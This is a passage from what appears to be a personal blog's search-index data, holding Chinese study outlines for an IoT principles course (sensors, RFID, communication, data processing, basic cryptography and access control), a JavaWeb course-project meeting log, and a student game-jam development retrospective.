[P278]聚类分析的概念和基于分层聚类和 K-means 的算法。 聚类分析：将物理或抽象对象的集合分组为由类似的对象组成的多个类的分析过程。\n分层聚类：分为【凝聚】和【分裂】\n【凝聚】：\nAGNES:两个簇里面的对象之间距离最小，两个簇会被合并。 ROCK：没看懂： 【分裂】：DIANA\n所有对象成为一个簇，按照某个原则分类指导数量满足要求。 K-means:看图说话\n第六章 1. [P299]感知层安全中常见的物理安全机制和[P301]基于散列锁定的逻辑安全机制。 物理安全机制（标签）:kill命令机制、电磁屏蔽、主动干扰、阻塞标签、可分离的标签\n散列锁定：\n给电子标签加锁。锁住的时候标签拒绝电子编码，只有发送给他正确的密钥才能解锁。 锁定过程： 阅读器有一个hash函数，他生成一个key，然后计算metaID=hash(key)，然后阅读器把metaID写入标签。 标签进入锁定状态 阅读器将（metaID，key）存到后台数据库 解锁过程： 读写器检测到标签进入范围之后，向标签发出查询信息，标签返回metaID给读写器 读写器用metaID为索引在后台数据库找key，发给标签 标签计算hash(key),得到的值和自己的metaID比较，相等就解锁，并发送真实ID给读写器。 2. [P314]经典密码学中基于变换和置换的加密方法。 变换：换换位置，统计概率就破解了\n置换：凯撒加密这类的\n3. [P316]现代密码学中基于流密码、DES 算法（私钥密码体制）和 RSA 算法（公钥密码体制）的基本原理。 流密码：明文密文连续加密解密，像水流一样。\nDES：\nDES对64位明文分组M分为左半部分和右半部分，都是32位长。\n用函数f对两部分进行16轮完全相同的迭代运算。\n16轮运算完毕后，将左右两部分合在一起经过一个逆置换产生密文。\nRSA：\n可能会出计算：\n4. [P322]云计算服务对密码设计的特殊需求。 需求：通过新型加密或扰动等方法对数据进行有效操作，以此来隐藏明文中的隐私信息，同时保证变换后数据仍能进行特定计算。\n5. [P325]身份认证的常见形式。 常见形式：\n用户名/密码方式：\n智能卡认证\n动态口令\nUSB Key认证\n生物识别\n步态识别\n6.[P327] 访问控制的基本概念和基本原则。 基本概念：在身份认证的基础上，依据授权对提出的资源访问请求加以控制。\n基本原则：\n最小特权原则：用户所拥有的权利不超过他执行工作所需权限。 多人负责原则：授权分散化，单人不能完成任务 职责分离原则：不同责任分派不同的人以相互牵制 7. [P330]数字签名的基本概念和实现过程。 基本概念：用户用自己的私钥对原始数据的哈希摘要进行加密所得的数据。\n实现过程：\n8. [P331]隐私保护的基本概念和实现方法。 隐私保护涉及两类信息标识：用户身份标识和位置信息标识。\n位置匿名技术：k-匿名、假位置、空间加密。\n押题 计算题： 第二章一个 第四章一个 浓缩版（） 第一章\n1.物联网的体系架构和各层的功能及关键技术。\n物联网的4层体系结构：感知控制层、数据传输层、数据组织与管理层、应用决策层\n感知控制层（感知层）：它是物联网发展和应用的基础，由RFID读写器、智能传感节点和接入网关等组成。各种传感节点通过感知目标环境的相关信息，并自行组网传递到网关接入点，网关将收集到的数据通过互联网络提交到后台计算系统处理。后台计算系统处理的结果可以反馈到本层，作为实施动态控制的依据。\n数据传输层：主要负责通过各种接入设备实现互联网、短距离无线网络和移动通信网等不同类型的网络融合，实现物联网感知与控制数据的高效、安全、和可靠传输。还提供路由、格式转换、地址转换等功能。\n数据组织与管理层：提供物联网资源的初始化，监测资源的在线运行状况，协调多个物联网资源（计算资源、通信设备和感知设备等）之间的工作，实现跨域资源间的交互、共享与调度，实现感知数据的语义理解、推理、决策以及提供数据的查询、存储、分析、挖掘等。并利用云计算平台为感知数据的存储、分析提供支持。云计算平台是信息处理的重要部分，也是应用层各种应用的基础。\n应用决策层：物联网应用决策层利用经过分析处理的感知数据，为用户提供多种不同类型的服务，如检索、计算和推理等。物联网应用可分为监控型、控制型、扫描型等。\n物联网的3层体系结构：感知控制层、数据传输层、数据处理层。\n感知控制层：感知控制层作为物联网的核心层，主要用于物品标识和信息的智能采集，它由基本的感应器件以及感应器组成的网络两大部分组成。\n数据传输层：主要完成接入和传输功能，是进行信息交换、传递的数据通路，包括接入网与传输网。\n数据处理层：数据处理层由业务支撑平台、网络管理平台、信息处理平台、服务支撑平台等组成，完成协同、管理、计算、存储、分析、挖掘以及提供面向行业和大众用户的服务等功能。\n关键技术：\n感知层：传感器技术、条形码技术、RFID技术、EPC技术、移动定位技术\n第二章\n1.传感器的组成和各模块的功能。\n2.传感器的特性(静态和动态特性指标和物理意义)。\n3.电阻应变式、电感式和电容式传感器的工作原理(基本的公式推导)。\n第三章\n1.二五条码、交叉二五条码的编码规则。\n2.快速反应(QR)码的码结构和各部分的意义。\n3.射频识别(RFID)系统的组成和工作原理。\n4.两类定位技术(基于测距和非测距)的工作原理。\n第四章(结合PPT资料)\n1.物联网通信系统模型和各模块的功能。\n2.采样定理及物理意义。p143\n3.非均匀量化相比于均匀量化的优势及实现原理。p145\n4.无线传感器网络中MAC层的TRAMA协议和网络层的常见路由协议。p206 p208\n第五章\n1.分类的概念和常见的分类算法(基于人工神经网络)。p270\n2.聚类分析的概念和常见的聚类算法。p278\n第六章\n1.感知层安全中常见的物理安全机制和逻辑安全机制。p299\n物理安全机制：\nkill命令机制、电磁屏蔽、主动干扰、阻塞标签、可分离的标签\nkill命令机制：\n逻辑安全机制：\n散列锁定、临时ID、同步方法与协议、重加密、其他方法（基于PFU的方法、基于掩码的方法）\n2.现代密码学中DES算法(私钥密码体制)和RSA算法(公钥密码体制)的基本原理。p317\n3.访问控制的基本概念和基本原则。p327\n4.数字签名的基本概念和实现过程。p330\n","date":"2022-06-19T07:16:00Z","permalink":"https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/","title":"物联网复习提纲"},{"content":"物联网复习提纲 他郑重地说了：“看看课后题。” 原文档非markdown格式，本文排版问题暂未修复。\n本课程复习提纲由我和@cheerg一起完成。\n复习资料为《物联网技术原理》\n第一章p22 物联网的体系架构、各层的功能及关键技术 物联网三层体系结构\n感知控制层：承担物体的标识、信息的采集和远程的控制。 数据传输层：承担各类设备的网络接入以及信息的传输。 数据处理层：完成信息的分析处理和决策。 各层的功能及关键技术\n感知控制层：\n物联网的核心层，主要用于物品标识和信息的智能采集。\n由【基本的感应器件】和【感应器组成的网络】两大部分组成。\n关键技术：\n传感器技术：把物理量转化为计算机能识别和处理的数字量的一种技术条形码技术****RFID技术：射频识别，通过无线电信号识别特定目标并读写相关数据EPC技术：电子产品代码，为每个产品提供唯一的电子标识符移动定位技术：通过与多个已知坐标位置的固定基站交互，获得启动目标在空间中的技术无线传感器网络：分布式传感网络物联网控制技术 数据传输层：\n主要完成接入和传输功能，是进行信息交换、传递的数据通路。\n由【接入网】和【传输网】两部分组成。\n传输网由公网与专网组成，样例：电信网、广电网、互联网\n接入网包括：光纤接入、无线接入、以太网接入，卫星接入。\n关键技术：\n短距离无线通信技术长距离无线通信技术有线通信技术 数据处理层：\n由【业务支撑平台】、【网络管理平台】、【信息处理平台】、【服务支撑平台】等组成。\n关键技术：\n第二章 传感器的组成和各模块的功能 传感器的概念：能感受规定的被测量的信息，并按照一定规律转换成可用信号的器件或装置，通常由敏感元件、转换元件和转换电路等组成。\n敏感元件\n概念：能直接感受或响应被测量，并输出与被测量物体成确定关系的某一物理量的元件。 转换元件\n概念：以敏感元件的输出作为输入，将敏感元件感受或响应的被测量转换成适于传输或测量的电信号。 转换电路\n概念：将转换元件输出的电路参数转换为一定范围内的电量输出。 传感器的特性（性能指标和物理意义） **[P34]**静态特性：被测量的值处于稳定状态时的输入/输出关系。\n静态特性的重要指标： 线性度、灵敏度、迟滞性、重复性、量程、其他特性（分辨率、阈值、稳定性、漂移）（有印象就行，概念不用背） **[P38]**动态特性：其输出对随时间变化的输入量的响应特性。\n动态响应特性分为：稳态响应特性和瞬态响应特性 动态特性往往从时域和频域两方面分析： 时域响应和时域性能指标 频域响应和频域性能指标 电阻应变式、电感式和电容式传感器的工作原理（基本的公式推导） 电阻应变效应原理\n原理：将电阻应变片粘贴到各种弹性敏感元件上，通过电阻应变片将应变转换为电阻变化。 公式推导： 电感式传感器\n原理：利用线圈自感或互感系数的变化来实现非电量电测的一种装置。 公式推导： 电容式传感器\n原理：以各种类型的电容器作为敏感元件，将被测物理量的变化转化为电容量的变化，再由转换电路转换为电压、电流或频率。\n变极距型：\n变面积型：\n变介质型：\n第三章 1.[P75]一维条形码的组成(模块、单元、符号)和扫码原理。 一维条形码是集条形码理论、光电技术、计算机技术、通信技术、条形码印制技术于一体的一种自动识别技术。\n构成条形码的基本单位是模块，模块是指条码中最窄的条或空，模块的宽度通常以mm或mil (1/1000in) 为单位。构成条码的一个条或空称为一个单元，一个单元包含的模块数是由编码方式决定的。\n扫码原理：条形码的扫描需要用到扫描器，扫描器利用自身光源照射条形码，再利用光电转换器接受反射的光线，将反射光线的明暗转换成数字信号。\n2.[P78]二五条码、交叉二五条码和三九条码的编码规则。 二五条码（最简单的条码）：是一种只有条表示信息的非连续型条码，每个字符由五个条组成，其中两个宽条，三个窄条，字符间隔是窄空，字符集为数字0~9。\n交叉二五条码：在二五条码的基础上，扩展到空也表示信息。\n三九条码：三九条码是一种一维条形码，是一种可供使用者双向扫描的分散式条码。\n三九条码拥有编码规则简单、误码率低，能表示字符个数多等特点。\n三九条码仅有两种单元宽度——宽单元和窄单元。宽单元的宽度为窄单元的1~3倍，一般多选用2倍、2.5倍或3倍。三九条码的每一个条码字符由九个单元组成，其中有三个宽单元，其余是窄单元，因此称为三九条码。三九条码的长度没有强迫性限制；三九条码的检查码可有可无；三九条码的起始码与终止码均为*字符。\n3.[P82]二维矩形码相比于一维条形码的优势。 二维码的特点：\n(1)信息容量大\n(2)编码范围广\n(3)保密、防伪性能好\n(4)译码可靠性高\n(5)修正错误能力强\n(6)容易制作且成本很低\n(7)条码符号的形状可变\n4.[P88]快速反应(QR)码的码结构和各部分的意义。 QR Code的结构： QR Code有五个部分： 定位图形：用于对二维码的定位，不同的qrcode固定存在，大小规格会有差异 校正图形：规格确定，校正图形的数量和位置也就确定了。 格式信息：表示该二维码的纠错级别，分为L、M、Q、H. 版本信息：二维码的规格，总共有40种规格矩阵。 数据和纠错码：实际保存的二维码信息和纠错码字（用于修正二维码损坏带来的错误）。 5.[P92]射频识别(RFID)系统的组成和工作原理。 RFID系统由电子标签、读写器和计算机网络组成的自动识别系统。\n从工作原理来看，系统一般由信号发射机、信号接收机、发射接收天线三部分组成。\n工作原理：\n电子标签和读写器利用各自携带的天线构筑两者之间进行数据传输的非接触式的通道。 当标签处于读写器的工作范围时，读写器用天线发信号。 电子标签接受信号产生感应电流，激活内部电路向读写器回送信号，或主动向读写器发送信号。 读写器收到信号后对信号做处理，然后将处理后的数据上传到数据管理系统进行下一步处理。 6.[P118]两类定位技术(基于测距和非测距)的工作原理(结合实验内容)。 基于测距：\n通过超声波或者无线电信号，测量声波或信号发送端到接收端时的信号强度、信号相位差以及信号传播时间差获取节点间的角度或距离信息。再利用空间几何方法完成未知节点的定位。 [P125]定位算法：时间定位（TOA）、到达时差定位（TDOA）、方向测量定位(AOA)、信号强度定位(RSSI) 无需测距：\n通过节点之间的信息交换和整个网络的连通性来实现定位，不需要额外网络设备。 [P130]定位算法：DV-Hop定位、APIT定位算法、凸规划算法。 第四章 1.[P138]物联网通信系统模型和各模块的功能。 信源：传感器在感知层采集到的信息。\n采样量化：模数变化，把作为模拟信号的原始信息在时间域和幅值域进行离散化处理，得到有限个幅度值的离散信号。\n编码：\n信源编码：提高传输有效性：保证无失真的情况下用平均码长最短的码承载信源信息熵。 信道编码：提高传输可靠性，引入额外监督位。 编码后输出的数字信号叫基带信号。 调制：\n目的：适合信道的传输特性并实现多路复用和多址接入。 实现：将低频基带信号搬移到高频载波信号处。 同步：\n载波同步：在接收端需要一个与发射端调制模块同频同相的载波信号，用于恢复出数字基带信号。 帧同步：使接收端知道每一帧数据包中有用的信息的开始和结束。 位同步：使接收端知道并判定每一位数字信号位。 2.[P140]通信指标的计算和物理意义。 数据传输速率\n第一种： 例题： 第二种： 误码率\n信道容量\n对于有限带宽无噪声信道： 对于有限带宽随机噪声信道： 3.[P143]采样定理及物理意义。 4.[P144]非均匀量化相比于均匀量化的优势及实现原理 量化特征有【均匀量化】和【非均匀量化】\n【均匀量化】的分层间隔为等间隔，适用于幅度均匀的分布的信号。\n特点：概率密度大的区域分层间隔小，反之分层间隔大。 缺点：在满足信噪比要求的输入信号取值范围内进行均匀量化时，信号动态范围将受到较大限制。 【非均匀量化】：根据信号的不同区间确定间隔。\n特点：小信号量化台阶减小，大信号的量化台阶增大。 改善小信号的信噪比，并在不增大量化级数的条件下使信号在较宽动态范围内信噪比达到指标要求。 5.[P147]无失真离散无记忆信源编码定理和变长编码。 信息量：\n信道熵：\n信源编码定理：\n变长编码：根据信源输出符号出现概率不同选择码字，出现概率大用短码，小的用长码，这样平均码长最短。\n哈夫曼编码：\n一个综合例题：\n6.[P151]线性分组码的实现和相关概念（监督矩阵、生成矩阵）。 k个信息位，r个监督位 监督矩阵和生成矩阵都是海明码，书上是（7，4）海明码，应该就考74乐\n监督矩阵Q：\n生成矩阵G： 7.[百度]同步的概念和不同层次（载波同步、帧同步、位同步）。 8.[P157]多址接入技术的基本概念和意义。 基本概念：通信系统通过信道来区分通信对象。一个用户一个信道，多个用户同时通话就是以不同信道加以区分。让众多的用户公用公共信道的一种技术。\n常见的应用方式：\n频分多址：传输信号的载波频率不同来区分信道。 时分多址：传输信号存在时间不同来区分信道。 码分多址：传输信号的码型不同来区分信道。 空分多址：通过空间的分割来区分信道。 9. 无线传感器网络中基于调度的 MAC 层[P206] TRAMA 协议、[P208]常见的路由协议（对比互联网中路由协议）、[P212]拓扑控制方法。 基于调度的MAC协议的基本思想：采用某种调度算法将时隙/信道/正交码字节分配给节点，让节点在给定的时隙/信道/正交码字内无冲突访问信道。\nTRAMA:包括邻居协议、调度交换协议、自适应时槽选择算法。将时间划分为交替性的随机访问周期和调度访问周期，周期长度不定。\n常见路由协议：\n以数据为中心的路由协议：定向扩散协议、SPIN协议 基于地理位置的路由协议：地理自适应保真路由协议、能量感知路由协议 提供数据流和服务质量保障的路由协议：有序分配路由策略、SPEED协议。 拓扑控制：功率控制和层次性拓扑控制\n第五章 1.[P240] 在基于 HDFS 的分布式文件存储系统中，文件的读取和写入过程。 文件的读取：\n客户端获取HDFS文件系统DistributedFileSystem实例，调用open()方法。 DistributeFileSystem通过RPC远程调用名称节点，确定文件组成单元块的位置信息。 名称节点返回每个单元块及其副本的数据节点地址，这些数据节点按照相对于客户机的距离排序。\nDistributedFileSystem向客户端返回FSDataInputStream，而FSDataInputStream封装了管理名称节点和数据节点I/O的DFSInpouStream。\n客户端调用FSDataInputStream的read()方法。 FSDataInputStream中的DFSInputStream保存前几个单元块的数据节点地址信息，然后连接存储着文件单元块的最近数据节点，重复调用read()方法读取数据，返回客户端。 第一个单元块读完，DFSInputStream关闭与该节点的连接，然后寻找下一个单元块。 最后，客户端调用FSDataInputStream的close()方法结束文件读取操作。 文件的写入：\n客户端调用DistributedFileSystem中的create()方法创建文件。 DistributedFileSystem通过RPC调用名称节点，创建新文件并分配单元块。 名称节点检查该文件之前不存在，并且客户端有权限创建文件，然后生成新文件记录，否则抛出异常。\nDistributedFileSystem向客户端返回FSDataOutStream开始写数据。\n客户端写入数据，DFSOutputStream将数据分包写入数据队列，同时询问名称节点、选择合适数据节点、分配新单元块。数据节点列表组成管道。 FSDataOutputStream向管道第一个数据节点传送数据，写完后依次向下继续。 DFSOutputStream等待所有数据节点写入。 DistributedFileSystem通知名称节点写文件结束。 2. 云计算和海计算出现的背景和意义。 人话翻译：\n云计算就是在互联网上有一群服务器能给你提供计算服务\n云计算能解决大规模数据处理问题，自己还不用买服务器，因此被业界认为是支撑物联网后端的最佳选择。 海计算就是一片海，海里每一滴水就是现实生活一个东西，这些东西能相互合作感知互动。\n海计算物理物体融入计算，每个个体可以单独计算还能协同组织。 3. [P268]预处理的常见类型和目的/意义。 预处理技术很多，常见的有：数据清洗、数据集成、数据转换、数据归约。\n预处理目的是提高数据挖掘的对象的质量。（这个东西就相当于过筛，好数据筛下去了，坏数据留下被处理掉）\n他的意义：帮助改善数据质量，提高数据挖掘进程的有效性和准确性，是整个数据处理的重要部分。\n4. [P270]分类的概念和常见的分类算法（决策树、最近邻分类 KNN 和人工神经网络 ANN）。 分类的概念：将对象指定给预先定义的多种类型中的一种。\n决策树：用于分类的一种树结构\n组成： 叶子节点：某个类或者类的分布。 其他节点：对某个属性的一次判定。 边：代表一个测试结果 决策树有【分类树】和【回归树】两种。决策树的结果是二叉树或多叉树。 最近邻分类KNN：一个样本在特征空间里寻找K个和他最像的样本，进入数量多的那一方的类别。\n缺点：样本不平衡的时候，新进去的样本会出现偏差。 解决方案：加权值。 人工神经网络ANN：我说不清，大概就是一种运算模型，有大量的节点，每个节点是一种输出函数，两个节点之间是加权值。\n5. [P275]关联分析的概念和基于 Apriori 的算法。 关联分析是在交易数据、关系数据或其他信息载体中，查找存在于项目集合或对象集合之间的频繁模式、关联、相关性或因果关系。\nApriori算法：详见【P276】\n6. [P278]聚类分析的概念和基于分层聚类和 K-means 的算法。 聚类分析：将物理或抽象对象的集合分组为由类似的对象组成的多个类的分析过程。\n分层聚类：分为【凝聚】和【分裂】\n【凝聚】：\nAGNES:两个簇里面的对象之间距离最小，两个簇会被合并。 ROCK：没看懂： 【分裂】：DIANA\n所有对象成为一个簇，按照某个原则分类指导数量满足要求。 K-means:看图说话\n第六章 1. [P299]感知层安全中常见的物理安全机制和[P301]基于散列锁定的逻辑安全机制。 物理安全机制（标签）:kill命令机制、电磁屏蔽、主动干扰、阻塞标签、可分离的标签\n散列锁定：\n给电子标签加锁。锁住的时候标签拒绝电子编码，只有发送给他正确的密钥才能解锁。 锁定过程： 阅读器有一个hash函数，他生成一个key，然后计算metaID=hash(key)，然后阅读器把metaID写入标签。 标签进入锁定状态 阅读器将（metaID，key）存到后台数据库 解锁过程： 读写器检测到标签进入范围之后，向标签发出查询信息，标签返回metaID给读写器 读写器用metaID为索引在后台数据库找key，发给标签 标签计算hash(key),得到的值和自己的metaID比较，相等就解锁，并发送真实ID给读写器。 2. [P314]经典密码学中基于变换和置换的加密方法。 变换：换换位置，统计概率就破解了\n置换：凯撒加密这类的\n3. [P316]现代密码学中基于流密码、DES 算法（私钥密码体制）和 RSA 算法（公钥密码体制）的基本原理。 流密码：明文密文连续加密解密，像水流一样。\nDES：\nDES对64位明文分组M分为左半部分和右半部分，都是32位长。\n用函数f对两部分进行16轮完全相同的迭代运算。\n16轮运算完毕后，将左右两部分合在一起经过一个逆置换产生密文。\nRSA：\n可能会出计算：\n4. [P322]云计算服务对密码设计的特殊需求。 需求：通过新型加密或扰动等方法对数据进行有效操作，以此来隐藏明文中的隐私信息，同时保证变换后数据仍能进行特定计算。\n5. [P325]身份认证的常见形式。 常见形式：\n用户名/密码方式：\n智能卡认证\n动态口令\nUSB Key认证\n生物识别\n步态识别\n6.[P327] 访问控制的基本概念和基本原则。 基本概念：在身份认证的基础上，依据授权对提出的资源访问请求加以控制。\n基本原则：\n最小特权原则：用户所拥有的权利不超过他执行工作所需权限。 多人负责原则：授权分散化，单人不能完成任务 职责分离原则：不同责任分派不同的人以相互牵制 7. [P330]数字签名的基本概念和实现过程。 基本概念：用户用自己的私钥对原始数据的哈希摘要进行加密所得的数据。\n实现过程：\n8. [P331]隐私保护的基本概念和实现方法。 隐私保护涉及两类信息标识：用户身份标识和位置信息标识。\n位置匿名技术：k-匿名、假位置、空间加密。\n押题 计算题： 第二章一个 第四章一个 浓缩版（） 第一章\n1.物联网的体系架构和各层的功能及关键技术。\n物联网的4层体系结构：感知控制层、数据传输层、数据组织与管理层、应用决策层\n感知控制层（感知层）：它是物联网发展和应用的基础，由RFID读写器、智能传感节点和接入网关等组成。各种传感节点通过感知目标环境的相关信息，并自行组网传递到网关接入点，网关将收集到的数据通过互联网络提交到后台计算系统处理。后台计算系统处理的结果可以反馈到本层，作为实施动态控制的依据。\n数据传输层：主要负责通过各种接入设备实现互联网、短距离无线网络和移动通信网等不同类型的网络融合，实现物联网感知与控制数据的高效、安全、和可靠传输。还提供路由、格式转换、地址转换等功能。\n数据组织与管理层：提供物联网资源的初始化，监测资源的在线运行状况，协调多个物联网资源（计算资源、通信设备和感知设备等）之间的工作，实现跨域资源间的交互、共享与调度，实现感知数据的语义理解、推理、决策以及提供数据的查询、存储、分析、挖掘等。并利用云计算平台为感知数据的存储、分析提供支持。云计算平台是信息处理的重要部分，也是应用层各种应用的基础。\n应用决策层：物联网应用决策层利用经过分析处理的感知数据，为用户提供多种不同类型的服务，如检索、计算和推理等。物联网应用可分为监控型、控制型、扫描型等。\n物联网的3层体系结构：感知控制层、数据传输层、数据处理层。\n感知控制层：感知控制层作为物联网的核心层，主要用于物品标识和信息的智能采集，它由基本的感应器件以及感应器组成的网络两大部分组成。\n数据传输层：主要完成接入和传输功能，是进行信息交换、传递的数据通路，包括接入网与传输网。\n数据处理层：数据处理层由业务支撑平台、网络管理平台、信息处理平台、服务支撑平台等组成，完成协同、管理、计算、存储、分析、挖掘以及提供面向行业和大众用户的服务等功能。\n关键技术：\n感知层：传感器技术、条形码技术、RFID技术、EPC技术、移动定位技术\n第二章\n1.传感器的组成和各模块的功能。\n2.传感器的特性(静态和动态特性指标和物理意义)。\n3.电阻应变式、电感式和电容式传感器的工作原理(基本的公式推导)。\n第三章\n1.二五条码、交叉二五条码的编码规则。\n2.快速反应(QR)码的码结构和各部分的意义。\n3.射频识别(RFID)系统的组成和工作原理。\n4.两类定位技术(基于测距和非测距)的工作原理。\n第四章(结合PPT资料)\n1.物联网通信系统模型和各模块的功能。\n2.采样定理及物理意义。p143\n3.非均匀量化相比于均匀量化的优势及实现原理。p145\n4.无线传感器网络中MAC层的TRAMA协议和网络层的常见路由协议。p206 p208\n第五章\n1.分类的概念和常见的分类算法(基于人工神经网络)。p270\n2.聚类分析的概念和常见的聚类算法。p278\n第六章\n1.感知层安全中常见的物理安全机制和逻辑安全机制。p299\n物理安全机制：\nkill命令机制、电磁屏蔽、主动干扰、阻塞标签、可分离的标签\nkill命令机制：\n逻辑安全机制：\n散列锁定、临时ID、同步方法与协议、重加密、其他方法（基于PFU的方法、基于掩码的方法）\n2.现代密码学中DES算法(私钥密码体制)和RSA算法(公钥密码体制)的基本原理。p317\n3.访问控制的基本概念和基本原则。p327\n4.数字签名的基本概念和实现过程。p330\n","date":"2022-06-17T02:30:00Z","permalink":"https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/","title":"《物联网技术原理》复习提纲"},{"content":"会议记录 Day1 2022/5/20 晚 确定小组成员。\n确定立项题目与方向：基于商城系统的游戏原型设计。\nDay2 2022/5/21 早 今日任务： 确定开发环境\n前端：html+css+js,使用Bootstrap框架\n后端：MVC开发模式，JSP+JavaBean+Servlet\nWeb应用服务器：tomcat 9.0.30\n数据库：MySQL\n功能需求分析\n前端页面需求： 网站欢迎页面：介绍网站作用，提供登录和注册的窗口。 注册和登录界面：传递用户信息到后端服务器与数据库交互。 商店页面：作为主界面显示各种道具供玩家选择，提供进入战斗页面的入口，同时可以查看个人资料、购物车。 个人资料页面：弹出展示，表现一些个人信息。 购物车页面：弹窗展示，展示玩家已选择的道具与效果。 战斗页面：游戏在该页面展示，玩家通过购买道具增强自己的属性或是削弱对手的属性，从而赢得胜利，进入下一关卡。 后端需求： 设计数据库内容： 需要两个库，库PlayerAccount存放用户登陆数据与游戏数据，库GameSetting存放道具信息与敌人信息。 库PlayerAccount中需要表players共一张表，表players中共number、name、password、hp、attack、defense，money七列。 库GameSetting中需要prop、enemy两张表，表prop中共number、name、type、variation、cost五列，表enemy中共number、name、hp、attack、defense、gold五列。 技术难点预处理\n同页面内弹出小窗 使用Bootstrap框架实现模态框。 servlet与jsp相互跳转时的路径 使用web.xml与绝对路径解决。 熟悉使用Github的协同工作\n在Github上创建私人项目并邀请小组成员进入。 小组使用Github Desktop图形化界面进行代码的协同工作。 遗留问题： 将样例代码修改为所需代码。 数据库更新，添加花费、金钱等重要选项。 显示个人信息。 购买道具后实现增益效果。 开始着手对战。 界面构筑。 玩家点击对战——提交数据到servlet——服务端返回数据——客户端表现完毕后结算。 胜利则保存数据，失败则重新来过。 Day3 2022/5/22 今日任务： 修复昨日遗留bug。 构建并丰富数据库表项。 开始分析核心代码思路并编写。 后端实现验证码注册登录、与数据库交互并实现保存登录信息。 前端实现登录与主界面的实现与优化。 未处理： 实现战斗 实现购买 Day4 2022/5/23 今日任务： 战斗环节初步完成：\n战斗思路：用户登陆后创建一个临时tmpPlayer用来供玩家修改属性，每次战斗获得胜利后才会修改保存原本数据库中的数据，这样实现存档功能。\n未处理： 实现ajax传json，本地根据传值结果做出相应界面变化。 按钮的开关操作。 循环调用js，目的是为了点一次按钮就开始执行战斗环节。 Day5 2022/5/24 今日任务： 现在开始使用bootstrap框架重构前端\nindex欢迎界面完成。 注册与登录通过模态框实现。 两个模态框分别刷新验证码，出错提示，重新打开刷新提示 将注册与登录同欢迎页面在一起，使用ajax实现登录、注册以及登录状态保存。同时可以跳转到游戏主界面。 遗留问题：注册失败\nDay6 2022/5/25 今日任务： url导入背景图片，改变其背景透明，透明度通过rgba（）实现。 界面布局高度不一致，尝试用flex修改 Day7 2022/5/26 今日任务： 完成装备的刷新机制。\njs获取div内容、克隆div，修改div各项属性及其子属性。、\n装备刷新使用正态分布生成概率5% 12% 25% 28% 30%（线性）\n500 5001700 17004200 42007000 700010000\n整体流程：Store.jsp-\u0026gt;GachaServlet-\u0026gt;DAO-\u0026gt;Servlet-\u0026gt;Store.jsp\nDay8 2022/5/27 今日任务： 重新编写了购买、修改购物车的逻辑 添加刷新玩家信息的函数，请求玩家数据的方法。 完成了战斗页面的构建，添加了逻辑。 两侧card，中间是ui以及展示区域。 完成PPT，完成视频展示，丰富数据库，找背景图以及怪物图。 顺利完成答辩。 最终界面： 使用的素材： 怪物图片：https://pixeljoint.com/pixelart/41620.htm\n道具图片：https://cheekyinkling.itch.io/shikashis-fantasy-icons-pack\n人物图片：https://craftpix.net/freebies/free-halfing-avatar-icons/\n背景图片：\nhttps://yangsh.artstation.com/projects/mq5GNd\nhttps://www.artstation.com/artwork/A95vPo\n","date":"2022-05-21T14:23:00Z","image":"https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/Welcome2_hu7370859387920934326.jpg","permalink":"https://dorinxl.github.io/p/2022javaweb%E8%AF%BE%E8%AE%BE%E5%9F%BA%E4%BA%8E%E8%B4%AD%E7%89%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%B8%E6%88%8F%E5%8E%9F%E5%9E%8B%E8%AE%BE%E8%AE%A1/","title":"【2022javaweb课设】基于购物系统的游戏原型设计"},{"content":"【开发复盘】2021网易游戏高校MINI-GAME挑战赛作品《戏幕未落》 欢迎大家给我们投票！ https://game.academy.163.com/event/mg?page=works\u0026id=2443\n依旧是主程，这次逻辑需求大概分为基本操作、对话系统、拍照系统、演绎系统四个方面。\n基本操作 初期为2d横板探索，之后修改为2d+3d探索，主要交互为对话触发剧情、特色为拍照系统与演绎系统。\n同上一个项目一样，3d场景+2d人物，添加了z轴移动，当然是有范围限制的。\n鉴于上一个项目的经验，这次直接给2d人物添加阴影。\n对话系统 对话用的框架被我大改特改，因为这次没有涉及到大量对话，所以没有用到excel来进行序列化，而是直接将剧情写在代码里当作字符串使用了。\n同时这个对话框架还是问题很大，市面上的商业文字游戏标准是十分的话，我手上的框架就只是二三分的水平。体量太大或者太小都不适用，也不安全。协程控制的一些效果也会有冲突。\n得想办法升级一下啊。\n拍照系统 其实就是找个camera来渲染画面，只渲染人物动作和场景，不渲染UI和其他乱七八糟的，然后在左下角加个游戏的logo，这样还可以分享照片达到游戏社交的效果。\n代码上就是用rect来控制宽高，然后创建一个Texture2D，将数据写入文件就好。\n演绎系统 因为大赛主题为“戏”，所以这个系统比较重要，大概分为三块。\n第一块：剪裁 大概意思就是在纸上剪个小人出来，会给你轮廓，然后需要玩家沿轮廓画线把小人裁出来。\n程序实现上有两处：画线和范围判定。\n画线借鉴了油管的该视频\n范围判定我没什么好的想法，就是在轮廓上取了十几个点，然后每帧计算鼠标坐标距离这些点的位置，最后鼠标松开的时候求个平均值来划范围。显然这也太蠢了，但我确实没什么好办法5555，其实如果多取几个点，取上百个点的话说不定会好一点。\n然后就是用DoTween进行一个动画的放~\n第二块：涂色 我管这个叫刮刮乐，就是两层，上面一层当作蒙版，鼠标在上面拖动就会擦除像素点，这段代码借鉴了这里并加了一些修改。总之是可以判断刮了多少范围，然后进行事件的触发。\n第三块：拼图 这个就比较简单了，简单的拖拽游戏。（原本策划说要可以随机摆放，我嫌麻烦给改成固定位置了）\n一些记录 这次用到了DoTween插件，我觉得可以用在对话框架里代替原本的一些渐入渐出啊移动之类的效果，真的很方便！ 果然游戏是不可以缺少音乐音效的，我一直打比方说如果一款游戏是个人，那么策划就构成了游戏的形体，美术组成血肉与皮肤，程序则负责搭建起骨架和神经。现在我要把音乐也加进去，音乐就是这个人的灵魂！！ 项目管理出了点问题，到最后加班的时候我电脑里素材乱七八糟的很难找到需要的东西。 最后差点做不完，可能我又要拼场景又要挂脚本吧，但是我觉得还是脚本写的不够优雅。很多触发事件都可以再精简一点，抽象成同一套机制。而且对话机制也需要修改一下。我需要找时间改一套自己的工具箱，可以拿出来就用。 